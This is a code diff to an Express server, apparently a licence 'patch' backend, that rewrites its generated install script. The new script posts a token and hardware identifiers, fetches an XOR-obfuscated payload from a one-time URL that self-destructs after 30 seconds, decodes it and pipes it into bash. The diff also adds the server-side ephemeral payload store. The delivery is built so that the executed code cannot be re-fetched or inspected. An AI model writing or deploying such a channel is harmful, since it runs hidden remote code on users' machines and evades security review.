@@ -1419,16 +1419,13 @@ _JB=$(python3 -c "import json,sys;print(json.dumps({'token':'${patch.token}','ra
 _RS=$(curl -s -X POST "${baseUrl}/api/patch-activate" \\
   -H "Content-Type: application/json" \\
   -d "\${_JB}")
-if echo "\${_RS}" | python3 -c "import sys,json;d=json.load(sys.stdin);exit(0 if 'error' in d else 1)" 2>/dev/null; then
-  echo "Error: $(echo "\${_RS}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('error','Unknown'))" 2>/dev/null)"
-  exit 1
-fi
-echo "\${_RS}" | python3 -c "
-import sys,json,base64
-d=json.load(sys.stdin)
-p=base64.b64decode(d['payload'])
+_EP=$(echo "\${_RS}" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('eph','')if 'eph' in d else 'ERR:'+d.get('error','Unknown'))" 2>/dev/null)
+case "\${_EP}" in ERR:*) echo "Error: \${_EP#ERR:}"; exit 1;; ""| *[!a-f0-9]*) echo "Error: activation failed"; exit 1;; esac
+curl -s "${baseUrl}/api/patch-payload/\${_EP}" | python3 -c "
+import sys
+p=sys.stdin.buffer.read()
 k=b'${patch.token}'
-print(bytes([p[i]^k[i%len(k)] for i in range(len(p))]).decode())
+sys.stdout.write(bytes([p[i]^k[i%len(k)] for i in range(len(p))]).decode())
 " | bash
 `;
 
@@ -1437,7 +1434,16 @@ print(bytes([p[i]^k[i%len(k)] for i in range(len(p))]).decode())
     res.send(script);
   });
 
-  // ─── Patch Activate (Public - called by install.sh) ────────
+  // ─── Ephemeral Token Store (in-memory, 30s TTL) ────────
+  const ephemeralPayloads = new Map<string, { payload: string; expires: number }>();
+  setInterval(() => {
+    const now = Date.now();
+    for (const [key, val] of ephemeralPayloads) {
+      if (now > val.expires) ephemeralPayloads.delete(key);
+    }
+  }, 5000);
+
+  // ─── Patch Activate (Public - called by thin agent) ────────
   app.use("/api/patch-activate", requireHttps);
   app.post("/api/patch-activate", async (req, res) => {
     const { token, raw_hwid, hostname, ip } = req.body;
@@ -1511,6 +1517,12 @@ print(bytes([p[i]^k[i%len(k)] for i in range(len(p))]).decode())
     const deployPayload = generatePatchDeployPayload(emulatorScript, verifyScript);
     const encryptedPayload = xorEncryptPayload(deployPayload, token);
 
+    const ephemeralId = crypto.randomBytes(32).toString("hex");
+    ephemeralPayloads.set(ephemeralId, {
+      payload: encryptedPayload,
+      expires: Date.now() + 30000,
+    });
+
     await storage.createActivityLog({
       licenseId: license.id,
       serverId: server.id,
@@ -1531,7 +1543,7 @@ print(bytes([p[i]^k[i%len(k)] for i in range(len(p))]).decode())
           { label: "Raw HWID Sources", value: "machine-id : product_uuid : MAC : board_serial : chassis_serial : disk_serial : cpu_serial", mono: true },
           { label: "حساب HWID", value: `SHA256(raw_hwid + ":" + ${hwidSalt})`, mono: true },
           { label: "IP المرسل", value: req.ip || "غير معروف" },
-          { label: "نوع التسليم", value: "Server-side payload (XOR مشفر)" },
+          { label: "نوع التسليم", value: "Ephemeral token (30s TTL)" },
         ],
       }),
     });
@@ -1539,8 +1551,27 @@ print(bytes([p[i]^k[i%len(k)] for i in range(len(p))]).decode())
     res.json({
       success: true,
       license_id: licenseId,
-      payload: encryptedPayload,
+      eph: ephemeralId,
     });
+  });
+
+  // ─── Ephemeral Payload Pickup (Public - one-time GET, self-destructs) ────────
+  app.use("/api/patch-payload/:eph", requireHttps);
+  app.get("/api/patch-payload/:eph", (req, res) => {
+    const ephId = String(req.params.eph);
+    const entry = ephemeralPayloads.get(ephId);
+
+    if (!entry || Date.now() > entry.expires) {
+      ephemeralPayloads.delete(ephId);
+      return res.status(410).send("gone");
+    }
+
+    ephemeralPayloads.delete(ephId);
+
+    const rawBytes = Buffer.from(entry.payload, "base64");
+    res.setHeader("Content-Type", "application/octet-stream");
+    res.setHeader("Cache-Control", "no-store, no-cache");
+    res.send(rawBytes);
   });
 
   // ─── Dashboard Stats ───────────────────────────────────────
